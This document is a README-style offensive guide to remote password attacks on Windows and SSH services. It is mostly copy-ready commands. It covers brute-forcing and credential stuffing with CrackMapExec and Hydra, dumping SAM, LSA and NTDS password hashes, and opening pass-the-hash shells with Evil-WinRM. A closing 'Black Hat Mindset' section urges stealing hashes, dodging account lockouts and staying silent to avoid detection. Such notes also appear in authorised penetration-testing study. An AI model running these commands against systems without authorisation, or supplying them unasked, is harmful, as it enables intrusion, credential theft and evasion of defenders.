# Basic Methodology - Remote Password Attacks

This README explores techniques for attacking remote services to crack passwords, enumerate shares, dump hashes, and establish sessions using stolen credentials.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Brute-Forcing with CrackMapExec (WinRM)](#brute-forcing-with-crackmapexec-winrm)
- [Enumerating SMB Shares with CrackMapExec](#enumerating-smb-shares-with-crackmapexec)
- [Brute-Forcing with Hydra](#brute-forcing-with-hydra)
- [Credential Stuffing with Hydra](#credential-stuffing-with-hydra)
- [Dumping SAM Hashes with CrackMapExec](#dumping-sam-hashes-with-crackmapexec)
- [Dumping LSA Secrets with CrackMapExec](#dumping-lsa-secrets-with-crackmapexec)
- [Dumping NTDS Hashes with CrackMapExec](#dumping-ntds-hashes-with-crackmapexec)
- [Pass-The-Hash with Evil-WinRM](#pass-the-hash-with-evil-winrm)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Remote password attacks target network services to gain unauthorized access by cracking credentials, enumerating resources, or extracting password hashes. This guide covers using CrackMapExec for brute-forcing and hash dumping, Hydra for credential attacks, and Evil-WinRM for pass-the-hash exploitation, focusing on Windows targets (WinRM, SMB) and SSH.

## Setup and Prerequisites

### Environment
- Linux host with network access to the target system.
- Tools: Install `crackmapexec` (e.g., `apt install crackmapexec`), `hydra` (e.g., `apt install hydra`), and `evil-winrm` (e.g., `gem install evil-winrm`).

### Files
- `user.list`: List of usernames (e.g., administrator, user)
- `password.list`: List of passwords (e.g., `/usr/share/wordlists/rockyou.txt`)
- `user_pass.list`: List of username:password pairs for credential stuffing

### Requirements
- IP Address: Identify the target IP address (e.g., `<ip>`)
- Credentials: Have usernames, passwords, or hashes ready for attacks

## Brute-Forcing with CrackMapExec (WinRM)

Attempt to brute-force credentials over WinRM.

```bash
crackmapexec winrm <ip> -u user.list -p password.list
```

Example:
```bash
crackmapexec winrm 192.168.1.100 -u user.list -p password.list
```
Output: Identifies valid credentials (e.g., `[+] user:password`).

## Enumerating SMB Shares with CrackMapExec

List SMB shares using known credentials.

```bash
crackmapexec smb <ip> -u "user" -p "password" --shares
```

Example:
```bash
crackmapexec smb 192.168.1.100 -u "administrator" -p "password123" --shares
```
Output: Lists shares like `IPC$`, `ADMIN$`, `C$`.

## Brute-Forcing with Hydra

Guess credentials for various services using Hydra.

```bash
# Multiple users and passwords
hydra -L user.list -P password.list <service>://<ip>

# Single user, multiple passwords
hydra -l username -P password.list <service>://<ip>

# Multiple users, single password
hydra -l user.list -p password <service>://<ip>
```

Example:
```bash
hydra -L user.list -P password.list ssh://192.168.1.100
```
Output: Identifies valid credentials (e.g., `user:password123`).

## Credential Stuffing with Hydra

Perform a credential stuffing attack.

```bash
hydra -C <user_pass.list> ssh://<IP>
```

Example:
```bash
hydra -C creds.txt ssh://192.168.1.100
```
Note: `creds.txt` format: `user1:pass1\nuser2:pass2`

## Dumping SAM Hashes with CrackMapExec

Extract password hashes from the SAM database.

```bash
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
```

Example:
```bash
crackmapexec smb 192.168.1.100 --local-auth -u administrator -p 'P@ssw0rd' --sam
```
Output: Dumps hashes like `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`

## Dumping LSA Secrets with CrackMapExec

Extract LSA secrets from the target.

```bash
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
```

Example:
```bash
crackmapexec smb 192.168.1.100 --local-auth -u administrator -p 'P@ssw0rd' --lsa
```
Output: May reveal credentials like `DefaultPassword:plaintextpass`.

## Dumping NTDS Hashes with CrackMapExec

Extract hashes from the NTDS file (Domain Controller).

```bash
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

Example:
```bash
crackmapexec smb 192.168.1.100 -u administrator -p 'P@ssw0rd' --ntds
```
Output: Dumps hashes like `user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`

## Pass-The-Hash with Evil-WinRM

Establish a session using a stolen hash.

```bash
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```

Example:
```bash
evil-winrm -i 192.168.1.100 -u Administrator -H "31d6cfe0d16ae931b73c59d7e0c089c0"
```
Output: Opens a PowerShell session on the target.

## Black Hat Mindset

- **Brute-Force Efficiently**: Use CrackMapExec and Hydra to systematically guess credentials without triggering lockouts.
- **Extract Hashes**: Target SAM, LSA, and NTDS to steal hashes for cracking or pass-the-hash attacks.
- **Leverage Stolen Credentials**: Use pass-the-hash with Evil-WinRM to gain shells without passwords.
- **Stay Silent**: Limit brute-force attempts and use stolen hashes to avoid detection.

## Resources

- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [Hydra Manual](https://github.com/vanhauser-thc/thc-hydra)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Pass-The-Hash Guide](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

